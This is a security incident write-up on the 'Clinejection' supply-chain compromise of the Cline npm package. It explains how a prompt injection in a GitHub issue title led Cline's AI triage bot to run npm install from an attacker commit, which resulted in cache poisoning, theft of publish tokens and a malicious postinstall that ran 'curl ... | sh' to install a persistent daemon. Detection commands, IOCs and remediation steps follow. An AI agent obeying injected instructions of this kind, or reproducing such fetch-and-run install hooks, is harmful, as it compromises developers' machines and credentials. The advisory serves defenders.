---
id: 2026-02-cline-clinejection
title: "Cline 'Clinejection' — AI triage bot → npm publish supply chain (February 2026)"
date_disclosed: 2026-02-09
last_updated: 2026-05-19
severity: critical
status: contained
ecosystems: [npm, ai-agents, cline]
tools_affected: [cline, openclaw]
tags: [supply-chain, prompt-injection, cache-poisoning, github-actions, openclaw, postinstall]
---

## TL;DR
On **2026-02-09**, security researcher **Adnan Khan** publicly disclosed "Clinejection" — a chain in the **Cline** AI coding agent's GitHub repo that let a maliciously titled issue tell Cline's own triage bot to run `npm install` from an attacker commit, dropping **Cacheract** into the GitHub Actions runner. Cacheract poisoned the Actions cache; the next scheduled publish workflow restored the poisoned cache and exfiltrated the npm publish token. **Eight days later**, on **2026-02-17 at 03:26 PT**, an unknown actor used that token to push **`cline@2.3.0`** to npm. The package's `postinstall` script silently installed **OpenClaw** as a system daemon on every developer machine that ran `npm install -g cline@2.3.0` or auto-updated during the eight-hour window before takedown — **~4,000 installs**. Cline's incident response botched key rotation (deleted the wrong token), leaving the exposed token live until a follow-up rotation.

## What happened

**Phase 1 — disclosure (2025-12 → 2026-02-09).** Khan found the chain in late December 2025 and submitted a GitHub Security Advisory + emailed Cline's security contact on **2026-01-01**. After receiving no substantive response, he disclosed publicly on **2026-02-09**. Cline removed the AI triage workflow ~30 minutes later but rotated the wrong token.

**Phase 2 — exploitation (2026-02-17).** An unknown actor — separate from Khan — used the still-live publish token to push **`cline@2.3.0`** to npm:

```
03:26 PT — cline@2.3.0 published with modified package.json
            postinstall: curl … | sh → downloads + installs OpenClaw
            registers OpenClaw as a launchd / systemd service
            reads/persists creds under ~/.openclaw/
~11:30 PT — npm + Cline take down the package (~8h live)
```

OpenClaw on the victim machine listens on the local Gateway API for remote commands. It survives reboot, can read repository working trees the user has open, and can call back to attacker-controlled C2 — effectively turning every infected developer workstation into a controlled AI-agent endpoint. Cline did not have a `package-lock.json` integrity gate, and the 2.3.0 release blended into the normal release cadence.

**Phase 3 — chain mechanics.** The original attack chain (now patched) was:

1. **Prompt-injection in issue title** → Cline's triage workflow read the issue title into the Claude system prompt.
2. **Workflow ran `npm install` from an attacker commit** because the injected instruction told it to.
3. **Attacker `preinstall` script dropped Cacheract** in the Actions runner.
4. **Cacheract over-filled the cache** (>10 GB junk → LRU eviction), then planted poisoned entries matching the nightly publish workflow's cache keys.
5. **Nightly publish workflow restored the poisoned cache**, which leaked `VSCE_PAT`, `OVSX_PAT`, `NPM_RELEASE_TOKEN` to a webhook.

This was the **first reported case** of an AI-triage bot being the *initial-access vector* for a developer-tools supply chain compromise, and the second cross-tool worm where the payload installs a *different* AI agent (cf. [Comment and Control](2026-04-comment-and-control-pr-injection.md)).

## Am I affected?

```bash
# Did you install cline@2.3.0?
npm ls -g cline 2>/dev/null
ls -la ~/.npm/_logs/ 2>/dev/null | grep -i cline

# Look for OpenClaw artifacts
ls -la ~/.openclaw/ 2>/dev/null
# macOS daemon
launchctl list 2>/dev/null | grep -i openclaw
# Linux daemon
systemctl --user list-units --all 2>/dev/null | grep -i openclaw
# Linux system
sudo systemctl list-units --all 2>/dev/null | grep -i openclaw
```

You are affected if `cline@2.3.0` ever landed in any global or project install between **2026-02-17 03:26 PT and ~11:30 PT** (the takedown window). The exact install count is ~4,000; if your CI installed Cline during that window, your CI is in scope too.

### IOCs

| Type | Value |
|---|---|
| Compromised version | `cline@2.3.0` (npm) |
| Live window | 2026-02-17 ~03:26 → ~11:30 PT (~8 hours) |
| Payload artifact | `~/.openclaw/` directory + OpenClaw daemon |
| Postinstall pattern | Modified `package.json` adds `postinstall` running `curl ... \| sh` |
| Leaked tokens (original chain) | `VSCE_PAT`, `OVSX_PAT`, `NPM_RELEASE_TOKEN` |
| Researcher (chain) | Adnan Khan |
| Cache-poison agent | Cacheract |

## If you are affected
1. Stop the OpenClaw daemon: `launchctl bootout` (macOS) or `systemctl disable --now openclaw*` (Linux); remove `~/.openclaw/`.
2. Treat the workstation as compromised. Follow [playbooks/if-you-installed-a-bad-npm-package.md](../playbooks/if-you-installed-a-bad-npm-package.md): rotate **all** developer credentials (npm, GitHub PAT, SSH keys, cloud creds, LLM keys) and audit recent git pushes / commits for unexpected commits.
3. Reinstall Cline from a known-good version (the maintainers republished as 2.3.1+ after the incident). Verify integrity against the GitHub release SHA.
4. If you are a Cline maintainer or anyone running an AI-triage bot on a GitHub repo: review your workflow YAML and **never let an LLM-generated string drive a `run:` step** or trigger `npm install` from non-trunk refs.

## Prevention
→ [playbooks/if-you-installed-a-bad-npm-package.md](../playbooks/if-you-installed-a-bad-npm-package.md)
→ [playbooks/if-your-npm-token-leaked.md](../playbooks/if-your-npm-token-leaked.md)
→ [prevention/agent-sandboxing.md](../prevention/agent-sandboxing.md)
→ [prevention/npm-hardening.md](../prevention/npm-hardening.md)
→ Do not let AI triage bots execute untrusted shell. Sandbox the LLM call away from any workflow secrets.

## Sources
- [Snyk — How "Clinejection" Turned an AI Bot into a Supply Chain Attack](https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions/) — Full chain analysis and timeline.
- [The Hacker News — Cline CLI 2.3.0 Supply Chain Attack Installed OpenClaw on Developer Systems](https://thehackernews.com/2026/02/cline-cli-230-supply-chain-attack.html) — Independent confirmation of the publish event and OpenClaw payload.
- [StepSecurity — Cline Supply Chain Attack Detected: cline@2.3.0 Silently Installs OpenClaw](https://www.stepsecurity.io/blog/cline-supply-chain-attack-detected-cline-2-3-0-silently-installs-openclaw) — IOCs and runner-side detection.
- [SafeDep — AI Agent Cline v2.3.0 Compromised: From Prompt Injection to Unauthorized npm Publish](https://safedep.io/cline-cli-compromised/) — Detection of the malicious version in real time.
- [Cremit — How a Single GitHub Issue Title Compromised 4000 Developer Machines](https://www.cremit.io/blog/ai-supply-chain-attack-clinejection) — Install-count and post-takedown context.
- [Rescana — Cline CLI 2.3.0 Supply Chain Attack: OpenClaw Unauthorized Installation](https://www.rescana.com/post/cline-cli-2-3-0-supply-chain-attack-openclaw-unauthorized-installation-on-developer-and-ci-cd-syste/) — CI/CD impact.
- [Dev|Journal — Clinejection: How Prompt Injection Compromised AI Coding Tools for 4,000 Developers](https://earezki.com/ai-news/2026-05-16-clinejection-when-your-ai-coding-tool-became-the-weapon/) — Retrospective analysis.
